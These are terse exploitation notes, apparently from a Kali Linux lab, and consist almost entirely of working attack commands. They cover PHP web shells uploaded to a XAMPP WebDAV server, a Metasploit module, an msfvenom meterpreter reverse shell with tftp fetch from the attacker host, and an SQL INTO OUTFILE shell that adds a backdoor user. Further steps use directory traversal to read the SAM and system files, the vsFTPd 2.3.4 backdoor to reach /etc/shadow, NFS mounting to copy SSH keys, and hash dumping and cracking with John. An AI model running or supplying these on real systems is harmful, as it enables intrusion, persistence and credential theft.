# Quick Exploitation Notes
### In Kali:

cadaver http://192.168.2.22/webdav
Username:wampp
Password:xampp

upload test.txt

####

Browse to it with Iceweasel in Kali Linux.
Maybe instead of a txt file we should upload a shellcode.php file.

####

cd /usr/share/webshells/php and choose simple-backdoor.php file.
after you upload it to the webdav server, browse to it:

http://192.168.2.22/simple-backdoor.php?cmd=dir

Instead of dir you can run more interesting commands, such as:

net+localgroup+administrators , to view all users in the Administrators group.
####

There's also a metasploit module

use exploit/windows/http/xampp_webdav_upload_php

we can also automate the exploitation with metasploit.

####
msfvenom -p php/meterpreter/reverse_tcp -o

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.21 LPORT=1234 > meterpreter.php
Now use a multihandler in metasploit to listen for the call back from meterpreter.php

####
Use help exploit in case you want to use more options when you run exploit.
sessions -l  - to display sessions

####
SQL Commands:

select * "<?php system($_GET['cmd'] ); ?>" into outfile "C:\\xampp\htdocs\shell.php"

192.168.2.22/shell.php?cmd=dir
192.168.2.22/shell.php?cmd=net user hacker hacker /add


####
atftp --daemon --bind-address 192.168.2.21 /tmp

netstat -antp

####
192.168.2.22/shell.php?cmd=tftp 192.168.2.21 get meterpreter.php c:\\xampp\\htdocs\\meterpreter.php

####

Directory traversal :
192.168.2.22:3232/index.html?../../../../../boot.ini
192.168.2.22:3232/index.html?../../../../../WINDOWS/repair/sam
192.168.2.22:3232/index.html?../../../../../WINDOWS/repair/system
192.168.2.22:3232/index.html?../../../../../xampp/FileZillaFtp/FileZillaServer.xml

####
Using Backdoor to Access and FTP Server:
vsFTPd 2.3.4

ftp 192.168.2.80
user: hacker:)
pass:

Now let's try to connect to it:
nc 192.168.1.80 6200
whoami
cat /etc/shadow

####
Attaching to an IP Address:

showmount -e 192.168.2.21
(it will show the share /export/hacker * )

Make a mount point:
mkdir /tmp/hacker

Attach it:
mount -t nfs -o nolock 192.168.2.21:/export/hacker  /tmp/hacker

We could copy hacker's id_rsa and id_rsa.pub (public key) to the local system. We can also do a 'cat' on the authorized files.

cp /tmp/hacker/id_rsa /root/.ssh/

####
Password Attacks:
Once we have the sam and system files we can use Kali to dump the passwords:

#bkhive system syskey.txt
#samdump2 sam syskey.txt

####
For online password attacks we can use Hydra.

####

For Off-line password attacks, we can use j0hn.

john windows7hashes.txt --wordlist=/usr/share/john/password.lst --format=nt

Windows XP encrypts its passwords with LM hash (old Windows hashes)
Windows 7 encrypts its passwords with NTLM (new NTLM hashes)

####
a
